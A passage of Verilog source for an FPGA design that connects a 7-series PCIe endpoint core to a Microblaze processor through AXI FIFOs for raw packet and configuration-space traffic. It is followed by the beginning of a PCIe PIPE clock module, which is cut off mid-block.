  inout spi_io1_io,
  inout spi_io2_io,
  inout spi_io3_io,
  inout spi_ss_io
);

  assign clkreq_l = 1'b0;
  
  //
  // Clock and reset
  //
  wire pipe_mmcm_rst_n;
  wire user_clk;
  wire user_reset;
  wire user_lnk_up;

  //
  // Transmit
  //
  wire s_axis_tx_tready;
  wire [3:0] s_axis_tx_tuser;
  wire [C_DATA_WIDTH - 1 : 0] s_axis_tx_tdata;
  wire [KEEP_WIDTH - 1 : 0] s_axis_tx_tkeep;
  wire s_axis_tx_tlast;
  wire s_axis_tx_tvalid;

  //
  // Receive
  //
  wire [C_DATA_WIDTH - 1 : 0] m_axis_rx_tdata;
  wire [KEEP_WIDTH - 1 : 0] m_axis_rx_tkeep;
  wire m_axis_rx_tlast;
  wire m_axis_rx_tvalid;
  wire m_axis_rx_tready;
  wire [21:0] m_axis_rx_tuser;

  //
  // Common
  //
  wire tx_cfg_gnt;
  wire rx_np_ok;
  wire rx_np_req;
  wire cfg_turnoff_ok;
  wire cfg_trn_pending;
  wire cfg_pm_halt_aspm_l0s;
  wire cfg_pm_halt_aspm_l1;
  wire cfg_pm_force_state_en;
  wire [1:0] cfg_pm_force_state;
  wire cfg_pm_wake;
  wire [63:0] cfg_dsn;

  //
  // Flow vontrol
  //
  wire [2:0] fc_sel;

  //
  // Configuration interface
  //
  wire cfg_err_ecrc;
  wire cfg_err_cor;
  wire cfg_err_atomic_egress_blocked;
  wire cfg_err_internal_cor;
  wire cfg_err_malformed;
  wire cfg_err_mc_blocked;
  wire cfg_err_poisoned;
  wire cfg_err_norecovery;
  wire cfg_err_acs;
  wire cfg_err_internal_uncor;
  wire cfg_err_ur;
  wire cfg_err_cpl_timeout;
  wire cfg_err_cpl_abort;
  wire cfg_err_cpl_unexpect;
  wire cfg_err_posted;
  wire cfg_err_locked;
  wire [47:0] cfg_err_tlp_cpl_header;
  wire [127:0] cfg_err_aer_headerlog;
  wire [4:0] cfg_aer_interrupt_msgnum;
  wire cfg_interrupt;
  wire cfg_interrupt_assert;
  wire [7:0] cfg_interrupt_di;
  wire cfg_interrupt_stat;
  wire [4:0] cfg_pciecap_interrupt_msgnum;
  wire cfg_to_turnoff;
  wire [7:0] cfg_bus_number;
  wire [4:0] cfg_device_number;
  wire [2:0] cfg_function_number;
  wire [31:0] cfg_mgmt_di;
  wire [31:0] cfg_mgmt_do;
  wire [3:0] cfg_mgmt_byte_en;
  wire [9:0] cfg_mgmt_dwaddr;
  wire cfg_mgmt_wr_en;
  wire cfg_mgmt_rd_en;
  wire cfg_mgmt_wr_readonly;
  wire cfg_mgmt_rd_wr_done;  

  //
  // Physical layer control and status interface
  //
  wire pl_directed_link_auton;
  wire [1:0] pl_directed_link_change;
  wire pl_directed_link_speed;
  wire [1:0] pl_directed_link_width;
  wire pl_upstream_prefer_deemph;

  //
  // System interface
  //
  wire sys_rst_n_c;
  wire sys_clk;

  //
  // Register declaration
  //
  reg user_reset_q;
  reg user_lnk_up_q;

  //
  // Local parameters
  //
  localparam TCQ = 1;
  localparam USER_CLK_FREQ = 2;
  localparam USER_CLK2_DIV2 = "FALSE";
  localparam USERCLK2_FREQ = (USER_CLK2_DIV2 == "TRUE") ? (USER_CLK_FREQ == 4) ? 3 : (USER_CLK_FREQ == 3) ? 2 : USER_CLK_FREQ: USER_CLK_FREQ;
  
  // Reset input buffer
  IBUF sys_reset_n_ibuf(.O( sys_rst_n_c ), .I( sys_rst_n ));
  
  // Transciever clock input buffer
  IBUFDS_GTE2 refclk_ibuf(.O( sys_clk ), .I( sys_clk_p ), .IB( sys_clk_n ), .CEB( 1'b0 ));

  always @(posedge user_clk) begin
  
    user_reset_q <= user_reset;
    user_lnk_up_q <= user_lnk_up;
    
  end

  assign pipe_mmcm_rst_n = 1'b1;

  //
  // PCI Express endpoint shared logic wrapper
  //
  pcie_7x_0_support #
  (	 
    .LINK_CAP_MAX_LINK_WIDTH( 1 ),              // PCIe Lane Width
    .C_DATA_WIDTH( C_DATA_WIDTH ),              // RX/TX interface data width
    .KEEP_WIDTH( KEEP_WIDTH ),                  // TSTRB width
    .PCIE_REFCLK_FREQ( REF_CLK_FREQ ),          // PCIe reference clock frequency
    .PCIE_USERCLK1_FREQ( USER_CLK_FREQ + 1 ),   // PCIe user clock 1 frequency
    .PCIE_USERCLK2_FREQ( USERCLK2_FREQ + 1 ),   // PCIe user clock 2 frequency             
    .PCIE_USE_MODE("1.0"),                      // PCIe use mode
    .PCIE_GT_DEVICE("GTP")                      // PCIe GT device
  ) 
  pcie_7x_0_support_i
  (
    // PCI Express transmit
    .pci_exp_txn( pcie_txn ),
    .pci_exp_txp( pcie_txp ),

    // PCI Express receive
    .pci_exp_rxn( pcie_rxn ),
    .pci_exp_rxp( pcie_rxp ),

    // Clocking sharing    
    .pipe_pclk_sel_slave( 1'b0 ),
    .pipe_mmcm_rst_n( pipe_mmcm_rst_n ),

    // AXI-S Common
    .user_clk_out( user_clk ),
    .user_reset_out( user_reset ),
    .user_lnk_up( user_lnk_up ),

    // AXI-S transmit
    .s_axis_tx_tready( s_axis_tx_tready ),
    .s_axis_tx_tdata( s_axis_tx_tdata ),
    .s_axis_tx_tkeep( s_axis_tx_tkeep ),
    .s_axis_tx_tuser( s_axis_tx_tuser ),
    .s_axis_tx_tlast( s_axis_tx_tlast ),
    .s_axis_tx_tvalid( s_axis_tx_tvalid ),

    // AXI-S receive
    .m_axis_rx_tdata( m_axis_rx_tdata ),
    .m_axis_rx_tkeep( m_axis_rx_tkeep ),
    .m_axis_rx_tlast( m_axis_rx_tlast ),
    .m_axis_rx_tvalid( m_axis_rx_tvalid ),
    .m_axis_rx_tready( m_axis_rx_tready ),
    .m_axis_rx_tuser( m_axis_rx_tuser ),

    // Flow control   
    .fc_sel( fc_sel ),

    // Management interface
    .cfg_mgmt_di( cfg_mgmt_di ),
    .cfg_mgmt_do( cfg_mgmt_do ),
    .cfg_mgmt_byte_en( cfg_mgmt_byte_en ),
    .cfg_mgmt_dwaddr( cfg_mgmt_dwaddr ),
    .cfg_mgmt_wr_en( cfg_mgmt_wr_en ),
    .cfg_mgmt_rd_en( cfg_mgmt_rd_en ),
    .cfg_mgmt_wr_readonly( cfg_mgmt_wr_readonly ),
    .cfg_mgmt_rd_wr_done( cfg_mgmt_rd_wr_done ),
    .cfg_mgmt_wr_rw1c_as_rw( 1'b0 ),    

    // Error reporting interface
    .cfg_err_ecrc( cfg_err_ecrc ),
    .cfg_err_ur( cfg_err_ur ),
    .cfg_err_cpl_timeout( cfg_err_cpl_timeout ),
    .cfg_err_cpl_unexpect( cfg_err_cpl_unexpect ),
    .cfg_err_cpl_abort( cfg_err_cpl_abort ),
    .cfg_err_posted( cfg_err_posted ),
    .cfg_err_cor( cfg_err_cor ),
    .cfg_err_atomic_egress_blocked( cfg_err_atomic_egress_blocked ),
    .cfg_err_internal_cor( cfg_err_internal_cor ),
    .cfg_err_malformed( cfg_err_malformed ),
    .cfg_err_mc_blocked( cfg_err_mc_blocked ),
    .cfg_err_poisoned( cfg_err_poisoned ),
    .cfg_err_norecovery( cfg_err_norecovery ),
    .cfg_err_tlp_cpl_header( cfg_err_tlp_cpl_header ),
    .cfg_err_locked( cfg_err_locked ),
    .cfg_err_acs( cfg_err_acs ),
    .cfg_err_internal_uncor( cfg_err_internal_uncor ),

    // AER interface 
    .cfg_err_aer_headerlog( cfg_err_aer_headerlog ),
    .cfg_aer_interrupt_msgnum( cfg_aer_interrupt_msgnum ),

    // AXI common
    .tx_cfg_gnt( tx_cfg_gnt ),
    .rx_np_ok( rx_np_ok ),
    .rx_np_req( rx_np_req ),
    .cfg_trn_pending( cfg_trn_pending ),
    .cfg_pm_halt_aspm_l0s( cfg_pm_halt_aspm_l0s ),
    .cfg_pm_halt_aspm_l1( cfg_pm_halt_aspm_l1 ),
    .cfg_pm_force_state_en( cfg_pm_force_state_en ),
    .cfg_pm_force_state( cfg_pm_force_state ),
    .cfg_dsn( cfg_dsn ),
    .cfg_turnoff_ok( cfg_turnoff_ok ),
    .cfg_pm_wake( cfg_pm_wake ),
  
    // RP only
    .cfg_pm_send_pme_to( 1'b0 ),
    .cfg_ds_bus_number( 8'b0 ),
    .cfg_ds_device_number( 5'b0 ),
    .cfg_ds_function_number( 3'b0 ),
    
    // EP Only
    .cfg_interrupt( cfg_interrupt ),
    .cfg_interrupt_assert( cfg_interrupt_assert ),
    .cfg_interrupt_di( cfg_interrupt_di ),    
    .cfg_interrupt_stat( cfg_interrupt_stat ),
    .cfg_pciecap_interrupt_msgnum( cfg_pciecap_interrupt_msgnum ),

    // Configuration interface     
    .cfg_to_turnoff( cfg_to_turnoff ),
    .cfg_bus_number( cfg_bus_number ),
    .cfg_device_number( cfg_device_number ),
    .cfg_function_number( cfg_function_number ),    

    // Physical layer control and status interface
    .pl_directed_link_change( pl_directed_link_change ),
    .pl_directed_link_width( pl_directed_link_width ),
    .pl_directed_link_speed( pl_directed_link_speed ),
    .pl_directed_link_auton( pl_directed_link_auton ),
    .pl_upstream_prefer_deemph( pl_upstream_prefer_deemph ),    
    .pl_transmit_hot_rst( 1'b0 ),
    .pl_downstream_deemph_source( 1'b0 ),

    // PCI Express DRP interface
    .pcie_drp_clk( 1'b1 ),
    .pcie_drp_en( 1'b0 ),
    .pcie_drp_we( 1'b0 ),
    .pcie_drp_addr( 9'h0 ),
    .pcie_drp_di( 16'h0 ),

    // System interface
    .sys_clk( sys_clk ),
    .sys_rst_n( sys_rst_n_c )
  );

  assign fc_sel = 3'b0;

  assign tx_cfg_gnt = 1'b1;                        // Always allow transmission of Config traffic within block
  assign rx_np_ok = 1'b1;                          // Allow Reception of Non-posted Traffic
  assign rx_np_req = 1'b1;                         // Always request Non-posted Traffic if available
  assign cfg_pm_wake = 1'b0;                       // Never direct the core to send a PM_PME Message
  assign cfg_trn_pending = 1'b0;                   // Never set the transaction pending bit in the Device Status Register
  assign cfg_pm_halt_aspm_l0s = 1'b0;              // Allow entry into L0s
  assign cfg_pm_halt_aspm_l1 = 1'b0;               // Allow entry into L1
  assign cfg_pm_force_state_en  = 1'b0;            // Do not qualify cfg_pm_force_state
  assign cfg_pm_force_state  = 2'b00;              // Do not move force core into specific PM state  
  assign s_axis_tx_tuser[0] = 1'b0;                // Unused for V6
  assign s_axis_tx_tuser[1] = 1'b0;                // Error forward packet
  assign s_axis_tx_tuser[2] = 1'b0;                // Stream packet

  assign cfg_err_cor = 1'b0;                       // Never report Correctable Error
  assign cfg_err_ur = 1'b0;                        // Never report UR
  assign cfg_err_ecrc = 1'b0;                      // Never report ECRC Error
  assign cfg_err_cpl_timeout = 1'b0;               // Never report Completion Timeout
  assign cfg_err_cpl_abort = 1'b0;                 // Never report Completion Abort
  assign cfg_err_cpl_unexpect = 1'b0;              // Never report unexpected completion
  assign cfg_err_posted = 1'b0;                    // Never qualify cfg_err_* inputs
  assign cfg_err_locked = 1'b0;                    // Never qualify cfg_err_ur or cfg_err_cpl_abort
  assign cfg_err_atomic_egress_blocked = 1'b0;     // Never report Atomic TLP blocked
  assign cfg_err_internal_cor = 1'b0;              // Never report internal error occurred
  assign cfg_err_malformed = 1'b0;                 // Never report malformed error
  assign cfg_err_mc_blocked = 1'b0;                // Never report multi-cast TLP blocked
  assign cfg_err_poisoned = 1'b0;                  // Never report poisoned TLP received
  assign cfg_err_norecovery = 1'b0;                // Never qualify cfg_err_poisoned or cfg_err_cpl_timeout
  assign cfg_err_acs = 1'b0;                       // Never report an ACS violation
  assign cfg_err_internal_uncor = 1'b0;            // Never report internal uncorrectable error
  assign cfg_err_aer_headerlog = 128'h0;           // Zero out the AER Header Log
  assign cfg_aer_interrupt_msgnum = 5'b00000;      // Zero out the AER Root Error Status Register
  assign cfg_err_tlp_cpl_header = 48'h0;           // Zero out the header information

  assign cfg_interrupt_stat = 1'b0;                // Never set the Interrupt Status bit
  assign cfg_pciecap_interrupt_msgnum = 5'b00000;  // Zero out Interrupt Message Number
  assign cfg_interrupt_assert = 1'b0;              // Always drive interrupt de-assert
  assign cfg_interrupt = 1'b0;                     // Never drive interrupt by qualifying cfg_interrupt_assert
  assign cfg_interrupt_di = 8'b0;                  // Do not set interrupt fields

  assign pl_directed_link_change = 2'b00;          // Never initiate link change
  assign pl_directed_link_width = 2'b00;           // Zero out directed link width
  assign pl_directed_link_speed = 1'b0;            // Zero out directed link speed
  assign pl_directed_link_auton = 1'b0;            // Zero out link autonomous input
  assign pl_upstream_prefer_deemph = 1'b1;         // Zero out preferred de-emphasis of upstream port

  assign cfg_mgmt_di = 32'h0;                      // Zero out CFG MGMT input data bus
  assign cfg_mgmt_byte_en = 4'h0;                  // Zero out CFG MGMT byte enables
  assign cfg_mgmt_wr_en = 1'b0;                    // Do not write CFG space
  assign cfg_mgmt_wr_readonly = 1'b0;              // Never treat RO bit as RW  

  // Assign the input DSN
  assign cfg_dsn = { `PCI_EXP_EP_DSN_2, 
                     `PCI_EXP_EP_DSN_1 };   
                   
  // Tx
  assign s_axis_tx_tuser = 0;
  
  reg [21:0] debounce = 0;
  reg [1:0] user_io_0 = 0;
  reg [1:0] user_io_1 = 0;
  
  //
  // debounce push buttons
  //
  always @(posedge sys_clk) begin
  
    // decrement counter
    debounce <= debounce - 1;
    
    if (debounce != 0) begin
    
      user_io_0[0] <= user_io[0] ? 1 : user_io_0[0];
      user_io_0[1] <= user_io[1] ? 1 : user_io_0[1];
      
    end else begin  
      
      user_io_1 <= user_io_0;
      user_io_0 <= 2'b00;
      
    end  
  end     
  
  wire [15:0] device_id;
  wire device_id_ready;

  // completer address
  assign device_id = { cfg_bus_number, cfg_device_number, cfg_function_number };

  assign device_id_ready = (cfg_bus_number == 0 && 
                            cfg_device_number == 0 && 
                            cfg_function_number == 0) ? 0 : 1;
 
  //
  // Microblaze common I/O
  //
  wire clk_out;
  wire [31:0] gpio_in;
  wire [31:0] gpio_out;
  
  // combined reset signal
  assign reset_n = sys_rst_n_c & ~user_io_1[1]; 
  
  // GPIO input
  assign gpio_in = { 15'h0, user_io_1[0], device_id };
  
  // LEDs
  assign user_led = ~{ gpio_out[0], user_lnk_up, device_id_ready }; 
  
  //
  // Quad SPI signals
  //
  wire spi_io0_i;
  wire spi_io0_o;
  wire spi_io0_t;  
  wire spi_io1_i;
  wire spi_io1_o;
  wire spi_io1_t;  
  wire spi_io2_i;
  wire spi_io2_o;
  wire spi_io2_t;  
  wire spi_io3_i;
  wire spi_io3_o;
  wire spi_io3_t;  
  wire spi_ss_i;
  wire spi_ss_o;
  wire spi_ss_t;  

  // SPI buffers  
  IOBUF spi_io0_iobuf(.I( spi_io0_o ), .IO( spi_io0_io ), .O( spi_io0_i ), .T( spi_io0_t ));
  IOBUF spi_io1_iobuf(.I( spi_io1_o ), .IO( spi_io1_io ), .O( spi_io1_i ), .T( spi_io1_t ));
  IOBUF spi_io2_iobuf(.I( spi_io2_o ), .IO( spi_io2_io ), .O( spi_io2_i ), .T( spi_io2_t ));
  IOBUF spi_io3_iobuf(.I( spi_io3_o ), .IO( spi_io3_io ), .O( spi_io3_i ), .T( spi_io3_t ));
  IOBUF spi_ss_iobuf(.I( spi_ss_o ), .IO( spi_ss_io ), .O( spi_ss_i ), .T( spi_ss_t ));  
  
  //
  // AXI DMA transmit
  //
  wire [63:0] M_AXIS_MM2S_0_tdata;
  wire [7:0] M_AXIS_MM2S_0_tkeep;
  wire M_AXIS_MM2S_0_tlast;
  wire M_AXIS_MM2S_0_tready;
  wire M_AXIS_MM2S_0_tvalid;
  
  //
  // AXI DMA receive
  //
  wire [63:0] S_AXIS_S2MM_0_tdata;
  wire [7:0] S_AXIS_S2MM_0_tkeep;
  wire S_AXIS_S2MM_0_tlast;
  wire S_AXIS_S2MM_0_tready;
  wire S_AXIS_S2MM_0_tvalid;  
  
  //
  // TLP receive FIFO
  //
  axis_data_fifo_0 fifo_tlp_rx_i(
    .s_axis_aresetn( ~user_reset ),
    .s_axis_aclk( user_clk ),
    .s_axis_tvalid( m_axis_rx_tvalid ),
    .s_axis_tready( m_axis_rx_tready ),
    .s_axis_tdata( m_axis_rx_tdata ),
    .s_axis_tkeep( m_axis_rx_tkeep ),
    .s_axis_tlast( m_axis_rx_tlast ),
    .m_axis_aclk( clk_out ),
    .m_axis_tvalid( S_AXIS_S2MM_0_tvalid ),
    .m_axis_tready( S_AXIS_S2MM_0_tready ),
    .m_axis_tdata( S_AXIS_S2MM_0_tdata ),
    .m_axis_tkeep( S_AXIS_S2MM_0_tkeep ),
    .m_axis_tlast( S_AXIS_S2MM_0_tlast )
  );

  //
  // TLP transmit FIFO
  //
  axis_data_fifo_0 fifo_tlp_tx_i(
    .s_axis_aresetn( ~user_reset ),
    .s_axis_aclk( clk_out ),
    .s_axis_tvalid( M_AXIS_MM2S_0_tvalid ),
    .s_axis_tready( M_AXIS_MM2S_0_tready ),
    .s_axis_tdata( M_AXIS_MM2S_0_tdata ),
    .s_axis_tkeep( M_AXIS_MM2S_0_tkeep ),
    .s_axis_tlast( M_AXIS_MM2S_0_tlast ),
    .m_axis_aclk( user_clk ),
    .m_axis_tvalid( s_axis_tx_tvalid ),
    .m_axis_tready( s_axis_tx_tready ),
    .m_axis_tdata( s_axis_tx_tdata ),
    .m_axis_tkeep( s_axis_tx_tkeep ),
    .m_axis_tlast( s_axis_tx_tlast )
  );
  
  //
  // Config space access data in
  //  
  wire [31:0] S0_AXIS_0_tdata;
  wire S0_AXIS_0_tlast;
  wire S0_AXIS_0_tready;
  wire S0_AXIS_0_tvalid;

  reg s_axis_cfg_rx_tlast = 1'b1;
  
  //
  // Config space access data out
  //
  wire [31:0] M0_AXIS_0_tdata;
  wire M0_AXIS_0_tlast;
  wire M0_AXIS_0_tready;
  wire M0_AXIS_0_tvalid;

  wire [31:0] m_axis_cfg_tx_tdata;

  reg m_axis_cfg_tx_tready = 1'b1;
  
  assign cfg_mgmt_dwaddr = m_axis_cfg_tx_tdata[9:0];

  //
  // Config space data in FIFO
  //
  axis_data_fifo_1 fifo_cfg_rx_i(
    .s_axis_aresetn( ~user_reset ),    
    .s_axis_aclk( user_clk ),    
    .s_axis_tvalid( cfg_mgmt_rd_wr_done ),
    .s_axis_tdata( cfg_mgmt_do ),
    .s_axis_tlast( s_axis_cfg_rx_tlast ),
    .m_axis_aclk( clk_out ),
    .m_axis_tvalid( S0_AXIS_0_tvalid ),
    .m_axis_tready( S0_AXIS_0_tready ),
    .m_axis_tdata( S0_AXIS_0_tdata ),
    .m_axis_tlast( S0_AXIS_0_tlast )
  );     

  //
  // Config space data out FIFO
  //
  axis_data_fifo_1 fifo_cfg_tx_i(        
    .s_axis_aresetn( ~user_reset ),
    .s_axis_aclk( clk_out ),
    .s_axis_tvalid( M0_AXIS_0_tvalid ),
    .s_axis_tready( M0_AXIS_0_tready ),
    .s_axis_tdata( M0_AXIS_0_tdata ),
    .s_axis_tlast( M0_AXIS_0_tlast ),
    .m_axis_aclk( user_clk ),
    .m_axis_tvalid( cfg_mgmt_rd_en ),    
    .m_axis_tdata( m_axis_cfg_tx_tdata ),
    .m_axis_tready( m_axis_cfg_tx_tready )
  );

  //
  // Microblaze instance
  //
  microblaze microblaze_i(
    .M_AXIS_MM2S_0_tdata( M_AXIS_MM2S_0_tdata ),
    .M_AXIS_MM2S_0_tkeep( M_AXIS_MM2S_0_tkeep ),
    .M_AXIS_MM2S_0_tlast( M_AXIS_MM2S_0_tlast ),
    .M_AXIS_MM2S_0_tready( M_AXIS_MM2S_0_tready ),
    .M_AXIS_MM2S_0_tvalid( M_AXIS_MM2S_0_tvalid ),
    .S_AXIS_S2MM_0_tdata( S_AXIS_S2MM_0_tdata ),
    .S_AXIS_S2MM_0_tkeep( S_AXIS_S2MM_0_tkeep ),
    .S_AXIS_S2MM_0_tlast( S_AXIS_S2MM_0_tlast ),
    .S_AXIS_S2MM_0_tready( S_AXIS_S2MM_0_tready ),
    .S_AXIS_S2MM_0_tvalid( S_AXIS_S2MM_0_tvalid ),
    .M0_AXIS_0_tdata( M0_AXIS_0_tdata ),
    .M0_AXIS_0_tlast( M0_AXIS_0_tlast ),
    .M0_AXIS_0_tready( M0_AXIS_0_tready ),
    .M0_AXIS_0_tvalid( M0_AXIS_0_tvalid ),
    .S0_AXIS_0_tdata( S0_AXIS_0_tdata ),
    .S0_AXIS_0_tlast( S0_AXIS_0_tlast ),
    .S0_AXIS_0_tready( S0_AXIS_0_tready ),
    .S0_AXIS_0_tvalid( S0_AXIS_0_tvalid ),
    .sys_clk( sys_clk ),
    .sys_rst_n( reset_n ),
    .clk_out( clk_out ), 
    .uart_rxd( uart_rxd ),
    .uart_txd( uart_txd ),
    .gpio_in_tri_i( gpio_in ),
    .gpio_out_tri_o( gpio_out ),
    .spi_io0_i( spi_io0_i ),
    .spi_io0_o( spi_io0_o ),
    .spi_io0_t( spi_io0_t ),
    .spi_io1_i( spi_io1_i ),
    .spi_io1_o( spi_io1_o ),
    .spi_io1_t( spi_io1_t ),
    .spi_io2_i( spi_io2_i ),
    .spi_io2_o( spi_io2_o ),
    .spi_io2_t( spi_io2_t ),
    .spi_io3_i( spi_io3_i ),
    .spi_io3_o( spi_io3_o ),
    .spi_io3_t( spi_io3_t ),
    .spi_ss_i( spi_ss_i_0 ),
    .spi_ss_o( spi_ss_o_0 ),
    .spi_ss_t( spi_ss_t )    
  );
 
endmodule

```

`hdl/pcie_7x_0_pipe_clock.v`:

```v
//
// PIPE Clock Module for 7 Series Transceiver
//

`timescale 1ns / 1ps

module pcie_7x_0_pipe_clock #
(
  parameter PCIE_ASYNC_EN = "FALSE",        // PCIe async enable
  parameter PCIE_TXBUF_EN = "FALSE",        // PCIe TX buffer enable for Gen1/Gen2 only
  parameter PCIE_CLK_SHARING_EN = "FALSE",  // Enable Clock Sharing
  parameter PCIE_LANE = 1,                  // PCIe number of lanes
  parameter PCIE_LINK_SPEED = 3,            // PCIe link speed 
  parameter PCIE_REFCLK_FREQ = 0,           // PCIe reference clock frequency
  parameter PCIE_USERCLK1_FREQ = 2,         // PCIe user clock 1 frequency
  parameter PCIE_USERCLK2_FREQ = 2,         // PCIe user clock 2 frequency
  parameter PCIE_OOBCLK_MODE = 1,           // PCIe oob clock mode
  parameter PCIE_DEBUG_MODE = 0             // PCIe Debug mode    
)(
  //
  // Input
  //
  input CLK_CLK,
  input CLK_TXOUTCLK,
  input [PCIE_LANE - 1 : 0] CLK_RXOUTCLK_IN,
  input CLK_RST_N,
  input [PCIE_LANE - 1 : 0] CLK_PCLK_SEL,
  input [PCIE_LANE - 1 : 0] CLK_PCLK_SEL_SLAVE,
  input CLK_GEN3,
  
  //  
  // Output
  //
  output CLK_PCLK,
  output CLK_PCLK_SLAVE,
  output CLK_RXUSRCLK,
  output [PCIE_LANE - 1 : 0] CLK_RXOUTCLK_OUT,
  output CLK_DCLK,
  output CLK_OOBCLK,
  output CLK_USERCLK1,
  output CLK_USERCLK2,
  output CLK_MMCM_LOCK  
);    
  
  // 
  // Select clock divider
  //
  localparam DIVCLK_DIVIDE = (PCIE_REFCLK_FREQ == 2) ? 1 :
                             (PCIE_REFCLK_FREQ == 1) ? 1 : 1;
                                               
  localparam CLKFBOUT_MULT_F = (PCIE_REFCLK_FREQ == 2) ? 4 :
                               (PCIE_REFCLK_FREQ == 1) ? 8 : 10;
               
  localparam CLKIN1_PERIOD = (PCIE_REFCLK_FREQ == 2) ? 4 :
                             (PCIE_REFCLK_FREQ == 1) ? 8 : 10;
                                               
  localparam CLKOUT0_DIVIDE_F = 8;
  localparam CLKOUT1_DIVIDE = 4;
    
  localparam CLKOUT2_DIVIDE = (PCIE_USERCLK1_FREQ == 5) ?  2 : 
                              (PCIE_USERCLK1_FREQ == 4) ?  4 :
                              (PCIE_USERCLK1_FREQ == 3) ?  8 :
                              (PCIE_USERCLK1_FREQ == 1) ? 32 : 16;
                                               
  localparam CLKOUT3_DIVIDE = (PCIE_USERCLK2_FREQ == 5) ?  2 : 
                              (PCIE_USERCLK2_FREQ == 4) ?  4 :
                              (PCIE_USERCLK2_FREQ == 3) ?  8 :
                              (PCIE_USERCLK2_FREQ == 1) ? 32 : 16;
                                           
  localparam CLKOUT4_DIVIDE = 20;
  localparam PCIE_GEN1_MODE = 1'b1;                                   
  
  //     
  // Input registers
  //
  (* ASYNC_REG = "TRUE", SHIFT_EXTRACT = "NO" *) reg [PCIE_LANE - 1 : 0] pclk_sel_reg1 = { PCIE_LANE{1'd0} };
  (* ASYNC_REG = "TRUE", SHIFT_EXTRACT = "NO" *) reg [PCIE_LANE - 1 : 0] pclk_sel_reg2 = { PCIE_LANE{1'd0} };
  (* ASYNC_REG = "TRUE", SHIFT_EXTRACT = "NO" *) reg [PCIE_LANE - 1 : 0] pclk_sel_slave_reg1 = { PCIE_LANE{1'd0} };        
  (* ASYNC_REG = "TRUE", SHIFT_EXTRACT = "NO" *) reg [PCIE_LANE - 1 : 0] pclk_sel_slave_reg2 = { PCIE_LANE{1'd0} };
  (* ASYNC_REG = "TRUE", SHIFT_EXTRACT = "NO" *) reg gen3_reg1 = 1'd0;
  (* ASYNC_REG = "TRUE", SHIFT_EXTRACT = "NO" *) reg gen3_reg2 = 1'd0;   
     
  //     
  // Internal signals
  // 
  wire refclk;
  wire mmcm_fb;
  wire clk_125mhz;
  wire clk_125mhz_buf;
  wire clk_250mhz;
  wire userclk1;
  wire userclk2;
  wire oobclk;  
  reg pclk_sel_slave = 1'd0;
  (* dont_touch = "true" *) reg pclk_sel = 1'd0;

  //
  // Output registers
  //
  wire pclk_1;
  wire pclk;
  wire userclk1_1;
  wire userclk2_1;
  wire mmcm_lock;
    
  //  
  // Generate per-lane signals
  //
  genvar i; // index for per-lane signals

  //
  // Input FF
  //
  always @ (posedge pclk) begin

    if (!CLK_RST_N) begin
    
      // 1-st stage FF
      pclk_sel_reg1 <= { PCIE_LANE{1'd0} };
      pclk_sel_slave_reg1 <= { PCIE_LANE{1'd0} };
      gen3_reg1 <= 1'd0;
      
      // 2-nd stage FF
      pclk_sel_reg2 <= { PCIE_LANE{1'd0} };
      pclk_sel_slave_reg2 <= { PCIE_LANE{1'd0} };
      gen3_reg2 <= 1'd0;
    
    end else begin
      
      // 1-st stage FF
      pclk_sel_reg1 <= CLK_PCLK_SEL;
      pclk_sel_slave_reg1 <= CLK_PCLK_SEL_SLAVE;
      gen3_reg1 <= CLK_GEN3;
      
      // 2-nd stage FF
      pclk_sel_reg2 <= pclk_sel_reg1;
      pclk_sel_slave_reg2 <= pclk_sel_slave_reg1;
      gen3_reg2 <= gen3_reg1;
      
    end  
  end

  // 
  // Select reference clock or TXOUTCLK
  //   
  generate if ((PCIE_TXBUF_EN == "TRUE") && (PCIE_LINK_SPEED != 3))

    begin : refclk_i

      // select reference clock 
      BUFG refclk_i(.I( CLK_CLK ), .O( refclk ));
      
    end else begin : txoutclk_i
    
      // select TXOUTCLK
      BUFG txoutclk_i(.I( CLK_TXOUTCLK ), .O( refclk ));
   
    end
  endgenerate

  //
  // MMCM
  //
  MMCME2_ADV #
  (
    .BANDWIDTH( "OPTIMIZED" ),
    .CLKOUT4_CASCADE( "FALSE" ),
    .COMPENSATION( "ZHOLD" ),
    .STARTUP_WAIT( "FALSE" ),
    .DIVCLK_DIVIDE( DIVCLK_DIVIDE ),
    .CLKFBOUT_MULT_F( CLKFBOUT_MULT_F ),  
    .CLKFBOUT_PHASE( 0.000 ),
    .CLKFBOUT_USE_FINE_PS( "FALSE" ),
    .CLKOUT0_DIVIDE_F( CLKOUT0_DIVIDE_F ),                    
    .CLKOUT0_PHASE( 0.000 ),
    .CLKOUT0_DUTY_CYCLE( 0.500 ),
    .CLKOUT0_USE_FINE_PS( "FALSE" ),
    .CLKOUT1_DIVIDE( CLKOUT1_DIVIDE ),                    
    .CLKOUT1_PHASE( 0.000 ),
    .CLKOUT1_DUTY_CYCLE( 0.500 ),
    .CLKOUT1_USE_FINE_PS( "FALSE" ),
    .CLKOUT2_DIVIDE( CLKOUT2_DIVIDE ),                  
    .CLKOUT2_PHASE( 0.000 ),
    .CLKOUT2_DUTY_CYCLE( 0.500 ),
    .CLKOUT2_USE_FINE_PS( "FALSE" ),
    .CLKOUT3_DIVIDE( CLKOUT3_DIVIDE ),                  
    .CLKOUT3_PHASE( 0.000 ),
    .CLKOUT3_DUTY_CYCLE( 0.500 ),
    .CLKOUT3_USE_FINE_PS( "FALSE" ),
    .CLKOUT4_DIVIDE( CLKOUT4_DIVIDE ),                  
    .CLKOUT4_PHASE( 0.000 ),
    .CLKOUT4_DUTY_CYCLE( 0.500 ),
    .CLKOUT4_USE_FINE_PS( "FALSE" ),
    .CLKIN1_PERIOD( CLKIN1_PERIOD ),                   
    .REF_JITTER1( 0.010 )    
  )
  mmcm_i
  (
     // Input
    .CLKIN1( refclk ),
    .CLKIN2( 1'd0 ),
    .CLKINSEL( 1'd1 ),
    .CLKFBIN( mmcm_fb ),
    .RST( !CLK_RST_N ),
    .PWRDWN( 1'd0 ), 
    
    // Output
    .CLKFBOUT( mmcm_fb ),
    .CLKOUT0( clk_125mhz ),
    .CLKOUT1( clk_250mhz ),
    .CLKOUT2( userclk1 ),
    .CLKOUT3( userclk2 ),
    .CLKOUT4( oobclk ),
    .LOCKED( mmcm_lock ),
    
    // Dynamic reconfiguration
    .DCLK( 1'd0 ),
    .DADDR( 7'd0 ),
    .DEN( 1'd0 ),
    .DWE( 1'd0 ),
    .DI( 16'd0 ),
    
    // Dynamic phase shift
    .PSCLK( 1'd0 ),
    .PSEN( 1'd0 ),
    .PSINCDEC( 1'd0 )
  ); 
  
  //
  // Select PCLK mux or PCLK buffer
  //
  generate if (PCIE_LINK_SPEED != 1) 

    begin : pclk_i1_bufgctrl
    
      // PCLK mux
